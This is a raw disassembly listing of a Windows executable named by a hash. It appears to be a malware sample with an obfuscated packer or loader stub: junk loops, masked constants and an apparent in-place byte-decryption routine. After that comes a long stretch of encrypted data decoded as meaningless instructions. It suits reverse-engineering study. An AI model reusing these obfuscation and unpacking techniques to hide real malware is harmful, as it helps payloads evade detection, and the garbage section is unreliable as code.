
50dac08aa9b02dc3a6d4ca387bf9a29047763302bf99e7b7d28d90e495229749.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,ds:0x42920b
  40100e:	mov    eax,DWORD PTR [eax]
  401010:	and    DWORD PTR ds:0x429157,eax
  401016:	mov    eax,DWORD PTR [ebp+0x8]
  401019:	and    DWORD PTR ds:0x4291e7,0x0
  401023:	mov    ecx,DWORD PTR ds:0x4291e7
  401029:	inc    ecx
  40102a:	mov    DWORD PTR ds:0x4291e7,ecx
  401030:	cmp    DWORD PTR ds:0x4291e7,0xe
  401037:	jle    0x401072
  40103d:	jmp    0x40104b
  401042:	push   DWORD PTR [ebp-0x20]
  401045:	call   DWORD PTR ds:0x42a793
  40104b:	cmp    DWORD PTR ds:0x4291e7,0xd
  401052:	jne    0x401065
  401058:	mov    ecx,DWORD PTR ds:0x4291e7
  40105e:	inc    ecx
  40105f:	mov    DWORD PTR ds:0x4291e7,ecx
  401065:	cmp    DWORD PTR ds:0x4291e7,0x1c
  40106c:	jb     0x401023
  401072:	push   ebx
  401073:	sub    DWORD PTR ds:0x429157,0x3bd6
  40107d:	push   esi
  40107e:	mov    esi,DWORD PTR ds:0x429907
  401084:	mov    ecx,DWORD PTR ds:0x429ff3
  40108a:	sub    ecx,esi
  40108c:	add    esi,DWORD PTR [esi+ecx*1]
  40108f:	push   edi
  401090:	mov    esi,0x75108ac
  401095:	xor    DWORD PTR ds:0x4291af,ebx
  40109b:	xor    eax,esi
  40109d:	mov    edi,0x3272f3
  4010a2:	sbb    DWORD PTR ds:0x4291f3,0x4c4b
  4010ac:	add    eax,edi
  4010ae:	and    DWORD PTR ds:0x429163,0x59cd
  4010b8:	mov    DWORD PTR [ebp-0x40],eax
  4010bb:	mov    eax,ds:0x42915f
  4010c0:	sbb    eax,DWORD PTR ds:0x42919f
  4010c6:	mov    ds:0x42915f,eax
  4010cb:	mov    eax,ds:0x42818b
  4010d0:	and    DWORD PTR ds:0x42918b,0x0
  4010da:	jmp    0x4010ee
  4010df:	xor    ecx,ecx
  4010e1:	xor    ecx,DWORD PTR ds:0x42918b
  4010e7:	inc    ecx
  4010e8:	mov    DWORD PTR ds:0x42918b,ecx
  4010ee:	cmp    DWORD PTR ds:0x42918b,0x1e
  4010f5:	jae    0x401144
  4010fb:	cmp    DWORD PTR ds:0x42918b,0xe
  401102:	ja     0x401144
  401108:	jmp    0x401123
  40110d:	push   DWORD PTR [ebp-0x24]
  401110:	push   0x428152
  401115:	push   0x4280c4
  40111a:	push   DWORD PTR [ebp-0x20]
  40111d:	call   DWORD PTR ds:0x42a79b
  401123:	cmp    DWORD PTR ds:0x42918b,0xd
  40112a:	jne    0x40113f
  401130:	xor    ecx,ecx
  401132:	or     ecx,DWORD PTR ds:0x42918b
  401138:	inc    ecx
  401139:	mov    DWORD PTR ds:0x42918b,ecx
  40113f:	jmp    0x4010df
  401144:	mov    eax,DWORD PTR [eax]
  401146:	mov    ecx,DWORD PTR ds:0x4291bf
  40114c:	sbb    DWORD PTR ds:0x42914f,ecx
  401152:	mov    DWORD PTR [ebp-0x3c],eax
  401155:	mov    eax,ds:0x429223
  40115a:	mov    ecx,DWORD PTR ds:0x42a003
  401160:	sub    eax,ecx
  401162:	add    eax,DWORD PTR [eax+ecx*1]
  401165:	mov    eax,ds:0x42839b
  40116a:	mov    DWORD PTR ds:0x429167,0x18
  401174:	cmp    DWORD PTR ds:0x429167,0x0
  40117b:	je     0x4011cb
  401181:	cmp    DWORD PTR ds:0x429167,0x3
  401188:	jle    0x4011cb
  40118e:	jmp    0x40119f
  401193:	push   DWORD PTR [ebp-0x24]
  401196:	push   DWORD PTR [ebp-0x14]
  401199:	call   DWORD PTR ds:0x42a79f
  40119f:	cmp    DWORD PTR ds:0x429167,0x4
  4011a6:	jne    0x4011b9
  4011ac:	mov    ecx,DWORD PTR ds:0x429167
  4011b2:	dec    ecx
  4011b3:	mov    DWORD PTR ds:0x429167,ecx
  4011b9:	mov    ecx,DWORD PTR ds:0x429167
  4011bf:	dec    ecx
  4011c0:	mov    DWORD PTR ds:0x429167,ecx
  4011c6:	jmp    0x401174
  4011cb:	mov    eax,DWORD PTR [eax]
  4011cd:	or     DWORD PTR ds:0x4291b7,0x5973
  4011d7:	mov    DWORD PTR [ebp-0x1c],eax
  4011da:	mov    DWORD PTR [ebp-0x34],0xf89c87a1
  4011e1:	sbb    ecx,ecx
  4011e3:	mov    eax,DWORD PTR [ebp-0x34]
  4011e6:	and    DWORD PTR ds:0x4291bf,ecx
  4011ec:	xor    eax,esi
  4011ee:	add    eax,edi
  4011f0:	adc    DWORD PTR ds:0x42919f,0x1e2a
  4011fa:	mov    DWORD PTR [ebp-0x40],eax
  4011fd:	mov    eax,ds:0x42830b
  401202:	mov    DWORD PTR [ebp-0x40],eax
  401205:	mov    eax,ds:0x429fff
  40120a:	mov    eax,DWORD PTR [eax]
  40120c:	and    DWORD PTR ds:0x4291f7,eax
  401212:	mov    eax,DWORD PTR [ebp-0x3c]
  401215:	adc    DWORD PTR ds:0x42914b,0x2509
  40121f:	mov    DWORD PTR [ebp-0x14],eax
  401222:	and    ecx,ecx
  401224:	mov    eax,DWORD PTR [ebp-0x14]
  401227:	xor    DWORD PTR ds:0x42918f,ecx
  40122d:	push   0x4
  40122f:	neg    ecx
  401231:	pop    ecx
  401232:	sub    ecx,eax
  401234:	and    DWORD PTR ds:0x42916b,0x0
  40123e:	jmp    0x40124e
  401243:	mov    eax,ds:0x42916b
  401248:	inc    eax
  401249:	mov    ds:0x42916b,eax
  40124e:	cmp    DWORD PTR ds:0x42916b,0x1e
  401255:	jae    0x40127d
  40125b:	cmp    DWORD PTR ds:0x42916b,0x27
  401262:	ja     0x40127d
  401268:	jmp    0x401278
  40126d:	push   0x4291bb
  401272:	call   DWORD PTR ds:0x42a7a3
  401278:	jmp    0x401243
  40127d:	add    ecx,DWORD PTR [ebp-0x1c]
  401280:	and    DWORD PTR ds:0x42915b,0x0
  40128a:	jmp    0x40129d
  40128f:	xor    eax,eax
  401291:	xor    eax,DWORD PTR ds:0x42915b
  401297:	inc    eax
  401298:	mov    ds:0x42915b,eax
  40129d:	cmp    DWORD PTR ds:0x42915b,0x1a
  4012a4:	jae    0x4012ec
  4012aa:	cmp    DWORD PTR ds:0x42915b,0xe
  4012b1:	jle    0x4012ec
  4012b7:	jmp    0x4012cc
  4012bc:	push   0x1df3
  4012c1:	push   0x428062
  4012c6:	call   DWORD PTR ds:0x42a7a7
  4012cc:	cmp    DWORD PTR ds:0x42915b,0xd
  4012d3:	jne    0x4012e7
  4012d9:	xor    eax,eax
  4012db:	xor    eax,DWORD PTR ds:0x42915b
  4012e1:	inc    eax
  4012e2:	mov    ds:0x42915b,eax
  4012e7:	jmp    0x40128f
  4012ec:	mov    DWORD PTR [ebp-0x2c],0xf89c85e1
  4012f3:	mov    DWORD PTR ds:0x4291d7,0x3a8d
  4012fd:	mov    DWORD PTR [ebp-0x18],ecx
  401300:	and    DWORD PTR ds:0x42916f,ecx
  401306:	mov    DWORD PTR [ebp-0xa0],0xf89c85bd
  401310:	mov    eax,DWORD PTR [ebp-0x14]
  401313:	xor    DWORD PTR ds:0x4291e7,0x69e7
  40131d:	mov    DWORD PTR [ebp-0x9c],eax
  401323:	mov    eax,DWORD PTR [ebp-0x18]
  401326:	or     DWORD PTR ds:0x42916f,0x429173
  401330:	mov    DWORD PTR [ebp-0x98],eax
  401336:	and    DWORD PTR ds:0x429187,ecx
  40133c:	mov    eax,DWORD PTR [ebp-0x2c]
  40133f:	xor    eax,esi
  401341:	mov    DWORD PTR ds:0x4291ab,0x4dc6
  40134b:	add    eax,edi
  40134d:	mov    DWORD PTR [ebp-0x94],eax
  401353:	adc    DWORD PTR ds:0x429193,0x429197
  40135d:	lea    eax,[ebp-0x48]
  401360:	sbb    DWORD PTR ds:0x42914f,0x4291c3
  40136a:	mov    DWORD PTR [ebp-0x90],eax
  401370:	mov    eax,ds:0x42917f
  401375:	or     DWORD PTR ds:0x4291bf,eax
  40137b:	mov    eax,DWORD PTR [ebp-0xa0]
  401381:	adc    DWORD PTR ds:0x429187,0x4291df
  40138b:	xor    eax,esi
  40138d:	add    eax,edi
  40138f:	mov    DWORD PTR [ebp-0xa0],eax
  401395:	lea    eax,[ebp-0xa0]
  40139b:	and    DWORD PTR ds:0x42919f,0x4291a7
  4013a5:	push   eax
  4013a6:	mov    eax,DWORD PTR [ebp+0xc]
  4013a9:	mov    DWORD PTR ds:0x42917b,0x524d
  4013b3:	xor    eax,esi
  4013b5:	add    eax,edi
  4013b7:	and    DWORD PTR ds:0x429183,0x429193
  4013c1:	push   eax
  4013c2:	sub    DWORD PTR ds:0x429173,0x45d8
  4013cc:	mov    eax,ds:0x42832b
  4013d1:	xor    DWORD PTR ds:0x42917b,0x37ec
  4013db:	push   0x428281
  4013e0:	sub    DWORD PTR ds:0x4291e3,0x5ee0
  4013ea:	push   DWORD PTR [eax]
  4013ec:	xor    DWORD PTR ds:0x42916b,0x429197
  4013f6:	call   0x4085e5
  4013fb:	and    DWORD PTR ds:0x429153,0x0
  401405:	mov    edx,DWORD PTR ds:0x429153
  40140b:	inc    edx
  40140c:	mov    DWORD PTR ds:0x429153,edx
  401412:	cmp    DWORD PTR ds:0x429153,0x24
  401419:	jb     0x401442
  40141f:	jmp    0x401435
  401424:	push   0x4280d6
  401429:	push   DWORD PTR [ebp-0x18]
  40142c:	push   DWORD PTR [ebp-0x14]
  40142f:	call   DWORD PTR ds:0x42a7af
  401435:	cmp    DWORD PTR ds:0x429153,0x15
  40143c:	jb     0x401405
  401442:	mov    ebx,DWORD PTR [ebp-0x14]
  401445:	add    DWORD PTR ds:0x42914f,edx
  40144b:	mov    eax,DWORD PTR [ebp-0x18]
  40144e:	and    DWORD PTR ds:0x42916b,0x0
  401458:	jmp    0x40146a
  40145d:	mov    edx,DWORD PTR ds:0x42916b
  401463:	inc    edx
  401464:	mov    DWORD PTR ds:0x42916b,edx
  40146a:	cmp    DWORD PTR ds:0x42916b,0x17
  401471:	jae    0x4014b1
  401477:	cmp    DWORD PTR ds:0x42916b,0xc
  40147e:	ja     0x4014b1
  401484:	jmp    0x401492
  401489:	push   DWORD PTR [ebp-0x24]
  40148c:	call   DWORD PTR ds:0x42a7b3
  401492:	cmp    DWORD PTR ds:0x42916b,0xb
  401499:	jne    0x4014ac
  40149f:	mov    edx,DWORD PTR ds:0x42916b
  4014a5:	inc    edx
  4014a6:	mov    DWORD PTR ds:0x42916b,edx
  4014ac:	jmp    0x40145d
  4014b1:	mov    DWORD PTR [ebp-0x58],eax
  4014b4:	add    DWORD PTR ds:0x4291c7,edi
  4014ba:	mov    DWORD PTR [ebp-0x34],0xf89c8538
  4014c1:	mov    eax,0xf89c85a3
  4014c6:	inc    DWORD PTR ds:0x42916f
  4014cc:	mov    DWORD PTR [ebp-0x1c],eax
  4014cf:	lea    ecx,[eax-0x2]
  4014d2:	inc    DWORD PTR ds:0x42919b
  4014d8:	mov    DWORD PTR [ebp-0x28],ecx
  4014db:	movzx  edx,BYTE PTR ds:0x429163
  4014e2:	or     DWORD PTR ds:0x4291e7,edx
  4014e8:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  4014ef:	mov    DWORD PTR [ebp-0x8],eax
  4014f2:	and    DWORD PTR ds:0x4291e7,0x0
  4014fc:	jmp    0x40150c
  401501:	mov    eax,ds:0x4291e7
  401506:	inc    eax
  401507:	mov    ds:0x4291e7,eax
  40150c:	cmp    DWORD PTR ds:0x4291e7,0x11
  401513:	jae    0x401543
  401519:	cmp    DWORD PTR ds:0x4291e7,0x13
  401520:	jge    0x401543
  401526:	jmp    0x40153e
  40152b:	push   0x4280b5
  401530:	push   DWORD PTR [ebp-0x28]
  401533:	push   0x738c
  401538:	call   DWORD PTR ds:0x42a7b7
  40153e:	jmp    0x401501
  401543:	mov    eax,DWORD PTR [ebp-0x10]
  401546:	sbb    DWORD PTR ds:0x429193,edi
  40154c:	xor    eax,esi
  40154e:	sub    edx,DWORD PTR ds:0x429193
  401554:	mov    edx,0xffcd8d8d
  401559:	sub    edx,eax
  40155b:	mov    DWORD PTR ds:0x42915b,edx
  401561:	mov    DWORD PTR [ebp-0xc],edx
  401564:	movzx  eax,WORD PTR ds:0x4291f7
  40156b:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  401572:	mov    eax,DWORD PTR [ebp-0x8]
  401575:	mov    DWORD PTR [ebp-0x3c],ebx
  401578:	cmp    eax,ecx
  40157a:	mov    DWORD PTR ds:0x4291d3,0x104a
  401584:	je     0x403bad
  40158a:	add    ecx,0x327f
  401590:	mov    eax,DWORD PTR [ebp-0x10]
  401593:	mov    ecx,DWORD PTR [ebp-0x10]
  401596:	sbb    DWORD PTR ds:0x4291b3,0x52cd
  4015a0:	xor    eax,esi
  4015a2:	xor    ecx,esi
  4015a4:	lea    ecx,[eax+ecx*1+0x64e5e6]
  4015ab:	mov    eax,DWORD PTR [ebp-0xc]
  4015ae:	or     DWORD PTR ds:0x429153,0x67db
  4015b8:	xor    edx,edx
  4015ba:	div    ecx
  4015bc:	mov    eax,DWORD PTR [ebp-0x8]
  4015bf:	xor    ecx,0x4574
  4015c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4015c8:	xor    eax,esi
  4015ca:	or     DWORD PTR ds:0x4291df,0xa4f
  4015d4:	xor    ecx,esi
  4015d6:	or     DWORD PTR ds:0x42915f,0x4291eb
  4015e0:	sub    eax,ecx
  4015e2:	cmp    edx,eax
  4015e4:	jne    0x401764
  4015ea:	mov    eax,DWORD PTR [ebp-0xc]
  4015ed:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4015f4:	add    ecx,DWORD PTR ds:0x4291d7
  4015fa:	mov    eax,DWORD PTR [ebp-0x28]
  4015fd:	mov    ecx,DWORD PTR [ebp-0x18]
  401600:	sub    DWORD PTR ds:0x42916f,0x2374
  40160a:	xor    eax,esi
  40160c:	add    DWORD PTR ds:0x429197,0x6412
  401616:	xor    ecx,esi
  401618:	add    eax,edi
  40161a:	add    ecx,edi
  40161c:	mov    DWORD PTR ds:0x42914f,0x798e
  401626:	mov    BYTE PTR [ebp-0x21],dl
  401629:	mov    DWORD PTR ds:0x42916f,0x52dc
  401633:	cmp    eax,ecx
  401635:	mov    DWORD PTR ds:0x42918f,0x1786
  40163f:	jae    0x401707
  401645:	and    DWORD PTR ds:0x42915b,ecx
  40164b:	lea    ecx,[eax-0x3272f3]
  401651:	not    edx
  401653:	mov    DWORD PTR [ebp-0x14],ecx
  401656:	mov    edx,DWORD PTR [ebp-0x14]
  401659:	xor    edx,esi
  40165b:	xor    DWORD PTR ds:0x4291a7,0x52cf
  401665:	add    edx,0x7f55d8e3
  40166b:	lea    ecx,[ebp+eax*4-0xb4]
  401672:	mov    DWORD PTR [ecx],edx
  401674:	mov    edx,DWORD PTR ds:0x429193
  40167a:	mov    edx,DWORD PTR [ecx]
  40167c:	cmp    edx,0x244ecb9c
  401682:	jbe    0x4016a7
  401688:	add    DWORD PTR ds:0x42916b,0x3ac8
  401692:	add    DWORD PTR [ecx],0x405fcdd
  401698:	mov    DWORD PTR ds:0x42919f,0x6763
  4016a2:	jmp    0x4016b7
  4016a7:	add    DWORD PTR ds:0x42914f,0x4291af
  4016b1:	add    DWORD PTR [ecx],0xfdaf4323
  4016b7:	sub    ecx,0x38f7
  4016bd:	mov    ecx,DWORD PTR [ebp-0x18]
  4016c0:	xor    DWORD PTR ds:0x4291c7,0x8c7
  4016ca:	xor    ecx,esi
  4016cc:	dec    DWORD PTR ds:0x42915b
  4016d2:	inc    eax
  4016d3:	sbb    DWORD PTR ds:0x4291cf,0x4291df
  4016dd:	inc    DWORD PTR [ebp-0x14]
  4016e0:	add    DWORD PTR ds:0x4291f3,0x429193
  4016ea:	add    ecx,edi
  4016ec:	cmp    eax,ecx
  4016ee:	mov    DWORD PTR ds:0x4291d3,0x74e1
  4016f8:	jb     0x401656
  4016fe:	not    DWORD PTR ds:0x4291af
  401704:	mov    dl,BYTE PTR [ebp-0x21]
  401707:	xor    DWORD PTR ds:0x429153,edi
  40170d:	mov    eax,DWORD PTR [ebp-0x34]
  401710:	mov    DWORD PTR ds:0x429173,0x31f7
  40171a:	xor    al,0xac
  40171c:	xor    DWORD PTR ds:0x429157,0x429193
  401726:	mov    cl,0xd
  401728:	sub    cl,al
  40172a:	add    dl,cl
  40172c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40172f:	adc    DWORD PTR ds:0x4291c3,0x11c9
  401739:	xor    cl,0xac
  40173c:	sub    cl,0xd
  40173f:	and    DWORD PTR ds:0x4291ef,0x4291b7
  401749:	ror    dl,cl
  40174b:	movzx  ecx,WORD PTR ds:0x4291e3
  401752:	sbb    DWORD PTR ds:0x4291ef,ecx
  401758:	xor    eax,eax
  40175a:	mov    eax,DWORD PTR [ebp-0xc]
  40175d:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  401764:	mov    eax,DWORD PTR [ebp-0xc]
  401767:	adc    ecx,0x7a4f
  40176d:	mov    ecx,DWORD PTR [ebp-0x28]
  401770:	or     DWORD PTR ds:0x42918f,0x42919b
  40177a:	jmp    0x403b2b
  40177f:	pop    ss
  401780:	mov    eax,0x80c4d8c4
  401785:	pop    es
  401786:	mov    al,0x4
  401788:	add    eax,0xc71d92fe
  40178d:	pop    esp
  40178e:	cmp    DWORD PTR [ebx-0x107c7c7d],eax
  401794:	pop    esp
  401795:	add    DWORD PTR [ebx+0x3e242d2a],0x26
  40179c:	cmp    ah,BYTE PTR [eax]
  40179e:	sub    al,0x7a
  4017a0:	cmp    eax,0x76167776
  4017a5:	jae    0x40181a
  4017a7:	jb     0x4017f4
  4017a9:	fcmovu st,st(5)
  4017ab:	(bad)  
  4017ac:	imul   edx,DWORD PTR [ecx+0x70],0x79a9607e
  4017b3:	jb     0x40181b
  4017b5:	int3   
  4017b6:	bound  edx,QWORD PTR [ebx+0x39]
  4017b9:	lea    eax,[ebx]
  4017bb:	xchg   esp,eax
  4017bc:	xchg   DWORD PTR [edx+edx*2+0x7c],esp
  4017c0:	inc    esp
  4017c1:	mov    DWORD PTR [edi+0x40bbb97c],esi
  4017c7:	sub    eax,0x3dd77fc
  4017cc:	push   0x46f21f7c
  4017d1:	rol    bl,cl
  4017d3:	repnz xchg esp,eax
  4017d5:	sub    bh,bl
  4017d7:	nop
  4017d8:	ss or  al,0x66
  4017db:	mov    al,0x93
  4017dd:	aad    0x4
  4017df:	jb     0x4017c3
  4017e1:	adc    eax,0x37030fe5
  4017e6:	and    DWORD PTR [ecx+0xd],edx
  4017e9:	aaa    
  4017ea:	jo     0x40185d
  4017ec:	(bad)  
  4017ed:	lods   al,BYTE PTR ds:[esi]
  4017ee:	sub    BYTE PTR [esi+0x1a],bl
  4017f1:	mov    bh,0xfc
  4017f3:	not    BYTE PTR [esi+0x30]
  4017f6:	test   DWORD PTR [ebx-0x2f],ecx
  4017f9:	pusha  
  4017fa:	push   es
  4017fb:	and    eax,DWORD PTR [ebx]
  4017fd:	cmp    DWORD PTR [esi+0x5ca1e278],0x2514be90
  401807:	fwait
  401808:	dec    esi
  401809:	or     BYTE PTR [edi+0x10888b3d],bl
  40180f:	jecxz  0x401843
  401811:	imul   edx,DWORD PTR [edx-0x79ab7bb],0xffffffcc
  401818:	xchg   ebx,eax
  401819:	ss xchg esi,eax
  40181b:	leave  
  40181c:	(bad)  
  40181d:	int    0x91
  40181f:	outs   dx,BYTE PTR ds:[esi]
  401820:	cmc    
  401821:	pop    edx
  401822:	imul   ecx,DWORD PTR [ebp+0xd],0x3f
  401826:	or     BYTE PTR [edi+0x18],al
  401829:	mov    dl,0x50
  40182b:	shl    DWORD PTR [ecx+ecx*2+0x26715d9],cl
  401832:	imul   esp,DWORD PTR [edi-0x46],0x6
  401836:	jno    0x4017f4
  401838:	add    DWORD PTR [ebx+0x1f],ebx
  40183b:	jns    0x47f51b0
  401841:	(bad)  
  401842:	pusha  
  401843:	inc    edi
  401844:	jo     0x401819
  401846:	icebp  
  401847:	test   cl,ch
  401849:	mov    ah,0x3b
  40184b:	pop    esp
  40184c:	fcomp  DWORD PTR [eax+0xef69195]
  401852:	cmp    bh,BYTE PTR cs:[esi]
  401855:	mov    es,esp
  401857:	addr16 in eax,dx
  401859:	imul   edi,ebx,0xbd8a2a17
  40185f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401860:	add    bl,0xdc
  401863:	retf   0x507f
  401866:	mov    ch,0x95
  401868:	(bad)  
  401869:	dec    edx
  40186a:	sbb    eax,DWORD PTR [edx+0x38]
  40186d:	stos   DWORD PTR es:[edi],eax
  40186e:	leave  
  40186f:	adc    eax,0x18449f76
  401874:	mov    bl,0x1
  401876:	push   ebp
  401877:	sub    eax,esi
  401879:	fild   WORD PTR [edx-0x41]
  40187c:	push   0xad4ff4a4
  401881:	adc    eax,0xa78c7879
  401886:	mov    ecx,0xe9dd2352
  40188b:	mov    ah,0x6e
  40188d:	(bad)  
  40188e:	daa    
  40188f:	push   0x5fb0345d
  401894:	cli    
  401895:	sbb    BYTE PTR [ebx+0x53cd1dc7],cl
  40189b:	pop    ebx
  40189c:	mov    es:0x390002d8,al
  4018a2:	dec    eax
  4018a3:	nop
  4018a4:	test   BYTE PTR [ecx],ch
  4018a6:	out    dx,al
  4018a7:	jnp    0x4018bc
  4018a9:	or     DWORD PTR [edx-0xb8256c1],ebx
  4018af:	fwait
  4018b0:	cmp    DWORD PTR [ecx+0x58],esp
  4018b3:	das    
  4018b4:	push   0xbeb95010
  4018b9:	pop    ss
  4018ba:	pusha  
  4018bb:	sub    BYTE PTR [edi+eiz*2-0x72],0xc2
  4018c0:	inc    ecx
  4018c1:	addr16 dec edi
  4018c3:	jmp    0xcd5ed488
  4018c8:	xor    BYTE PTR [esp+eax*4],cl
  4018cb:	sbb    DWORD PTR [eax-0x5c4a0be8],0x45
  4018d2:	rcl    BYTE PTR [esi+0x39135c67],1
  4018d8:	push   ss
  4018d9:	dec    edi
  4018da:	or     al,0x38
  4018dc:	mov    ebp,0x1348e088
  4018e1:	mov    ecx,0xdb276d69
  4018e6:	je     0x4018a5
  4018e8:	cmp    al,0xeb
  4018ea:	sub    BYTE PTR [edx-0x1438cd17],dh
  4018f0:	arpl   WORD PTR [esi-0x5a],sp
  4018f3:	inc    BYTE PTR [ebx+0x37]
  4018f6:	cli    
  4018f7:	xchg   edi,eax
  4018f8:	pop    ebp
  4018f9:	mov    fs,WORD PTR [esi]
  4018fb:	in     al,0x80
  4018fd:	mov    dh,0x2
  4018ff:	mov    ds:0x49ef5169,al
  401904:	into   
  401905:	jnp    0x4018ac
  401907:	outs   dx,DWORD PTR ds:[esi]
  401908:	mov    edx,0x7abb5e0
  40190d:	sti    
  40190e:	xchg   ebx,eax
  40190f:	xor    esi,esi
  401911:	aaa    
  401912:	adc    bh,BYTE PTR [esi-0x45d29790]
  401918:	inc    ecx
  401919:	cdq    
  40191a:	fwait
  40191b:	pop    es
  40191c:	test   al,0xd9
  40191f:	out    dx,eax
  401920:	add    BYTE PTR [eax-0x296a5f4e],bh
  401926:	test   al,0x3a
  401928:	rol    DWORD PTR ds:0x55f11210,cl
  40192e:	repz popa 
  401930:	add    al,BYTE PTR [ebx]
  401932:	ds clc 
  401934:	pop    ebp
  401935:	stc    
  401936:	jae    0x401955
  401938:	into   
  401939:	mov    ah,0xbb
  40193b:	and    esi,eax
  40193d:	sub    al,0x8f
  40193f:	sbb    eax,0x5cbcd95f
  401944:	cmp    esp,ebp
  401946:	mov    edx,DWORD PTR [esi+0x30fdf9d2]
  40194c:	call   0xd12:0x792a3730
  401953:	sbb    cl,ch
  401955:	sub    edx,DWORD PTR [ebp+eax*1+0x2a925c59]
  40195c:	sub    eax,0xb36adb81
  401961:	xchg   ebx,eax
  401962:	dec    edi
  401963:	and    DWORD PTR [edi+0x3e],ebx
  401966:	dec    esp
  401967:	lahf   
  401968:	adc    ah,BYTE PTR [edi-0x913e45b]
  40196e:	mov    edi,0x483704c1
  401973:	mov    esi,0xd6814d19
  401978:	and    eax,0x11f2b172
  40197d:	sub    BYTE PTR [ecx-0x5a],0xec
  401981:	pop    ebx
  401982:	xchg   esi,eax
  401983:	pop    edx
  401984:	inc    ebx
  401985:	push   ebp
  401986:	mov    ds:0x1c11ddb4,al
  40198b:	push   es
  40198c:	mov    dl,0xc8
  40198e:	push   ebx
  40198f:	jb     0x40191d
  401991:	adc    esp,DWORD PTR [ebp+0x2d]
  401994:	in     al,dx
  401995:	shl    BYTE PTR [ebx-0x19],cl
  401998:	fs in  eax,dx
  40199a:	leave  
  40199b:	mov    ds:0x7bd9a3d5,al
  4019a0:	sub    BYTE PTR [esp+edi*4-0x2cf6cbab],ch
  4019a7:	retf   0x3af7
  4019aa:	ror    BYTE PTR [esi*4-0x55f85ec9],1
  4019b1:	add    eax,0x6a230b78
  4019b6:	mov    bl,0x68
  4019b8:	fsincos 
  4019ba:	aas    
  4019bb:	scas   eax,DWORD PTR es:[edi]
  4019bc:	push   ds
  4019bd:	cmp    al,0x43
  4019bf:	and    cl,BYTE PTR [eax+0x48]
  4019c2:	or     esp,DWORD PTR [ebp-0x7a508c6]
  4019c8:	sub    eax,0x88eaeaf8
  4019cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019ce:	dec    esp
  4019cf:	ficom  WORD PTR [edi+0x53174536]
  4019d5:	leave  
  4019d6:	inc    edi
  4019d7:	cli    
  4019d8:	pop    esi
  4019d9:	pop    ecx
  4019da:	pushf  
  4019db:	pop    es
  4019dc:	dec    ecx
  4019dd:	mov    esi,0xe3369859
  4019e2:	pop    ebp
  4019e3:	jae    0x4019ec
  4019e5:	push   cs
  4019e6:	fdiv   QWORD PTR [edx+0x1effdf3]
  4019ec:	mov    ds,WORD PTR [ebx+0x15]
  4019ef:	mov    ds:0x8c183204,al
  4019f4:	xchg   edx,eax
  4019f5:	test   DWORD PTR [ecx],ebp
  4019f7:	jnp    0x40197f
  4019f9:	retf   
  4019fa:	inc    edx
  4019fb:	and    eax,0xa70765ce
  401a00:	rol    ebx,0x5e
  401a03:	adc    dh,BYTE PTR [ecx+ebp*4+0xa2c8d82]
  401a0a:	jae    0x4019e4
  401a0c:	(bad)  
  401a0d:	das    
  401a0e:	xor    eax,0xbc7c0181
  401a13:	fwait
  401a14:	shl    BYTE PTR [esi+ebp*8+0x4b8dbf97],1
  401a1b:	xor    eax,0x8e0a8031
  401a20:	das    
  401a21:	addr16 iret 
  401a23:	dec    ebx
  401a24:	sub    BYTE PTR [eax],dh
  401a26:	loope  0x401aa7
  401a28:	sbb    DWORD PTR [ebp-0x43eb254],edx
  401a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a2f:	in     al,0x82
  401a31:	retf   0xd815
  401a34:	out    dx,eax
  401a35:	mov    edx,0x978c3df2
  401a3a:	add    ecx,DWORD PTR [ebx-0x5b]
  401a3d:	sbb    DWORD PTR [ebp+0x10],0xffffffbd
  401a41:	inc    ebp
  401a42:	data16 or BYTE PTR [edx],dh
  401a45:	retf   
  401a46:	pop    ebp
  401a47:	mov    al,0x23
  401a49:	test   al,0x5e
  401a4b:	sahf   
  401a4c:	inc    edi
  401a4d:	cmp    al,0xc9
  401a4f:	mov    ds:0x3b3d0bce,al
  401a54:	inc    ebp
  401a55:	loop   0x401a90
  401a57:	dec    esi
  401a58:	pop    esi
  401a59:	cmc    
  401a5a:	cmp    ah,BYTE PTR [eax+0xb]
  401a5d:	out    0x79,eax
  401a5f:	jb     0x401a2b
  401a61:	jle    0x401a36
  401a63:	inc    esi
  401a64:	in     al,dx
  401a65:	push   es
  401a66:	ja     0x401a78
  401a68:	ret    
  401a69:	xchg   ecx,eax
  401a6a:	test   BYTE PTR [ecx+0x6dfb821e],bl
  401a70:	icebp  
  401a71:	pop    ecx
  401a72:	pop    ebp
  401a73:	call   0xe4889fb7
  401a78:	inc    esp
  401a79:	mov    esi,ss
  401a7b:	sbb    BYTE PTR [edx-0x43],al
  401a7e:	jno    0x401aa0
  401a80:	scas   al,BYTE PTR es:[edi]
  401a81:	lea    edi,[edx-0x9]
  401a84:	ret    
  401a85:	stc    
  401a86:	mov    WORD PTR ds:0x7781dfd,?
  401a8c:	xchg   esp,eax
  401a8d:	xlat   BYTE PTR ds:[ebx]
  401a8e:	jo     0x401a8a
  401a90:	imul   esi,DWORD PTR [edx+0x49],0x53
  401a94:	int3   
  401a95:	shr    BYTE PTR [ebx+0x19293306],1
  401a9b:	or     al,0xc
  401a9d:	sub    DWORD PTR [esi+0x756e6d9e],ecx
  401aa3:	dec    eax
  401aa4:	add    eax,0x6f67a6d1
  401aa9:	or     ebx,DWORD PTR [edx-0x3e]
  401aac:	sub    cl,BYTE PTR [edx-0x45]
  401aaf:	pop    es
  401ab0:	dec    BYTE PTR [edi]
  401ab2:	sti    
  401ab3:	imul   ebp,DWORD PTR [ebp+0x557c7360],0xfffffff5
  401aba:	(bad)  
  401abc:	push   edx
  401abd:	mov    WORD PTR [ebx-0x3d],cs
  401ac0:	fdivr  st(5),st
  401ac2:	stc    
  401ac3:	mov    ecx,0x716cbdad
  401ac8:	xchg   edx,eax
  401ac9:	stc    
  401aca:	xor    al,0x6b
  401acc:	fsubr  QWORD PTR [ecx+0x69333301]
  401ad2:	test   eax,0x5e0b0f8c
  401ad7:	mov    dh,BYTE PTR [edx+0x2c]
  401ada:	push   esp
  401adb:	adc    BYTE PTR [ebx+0x253e610],dh
  401ae1:	pop    ss
  401ae2:	dec    eax
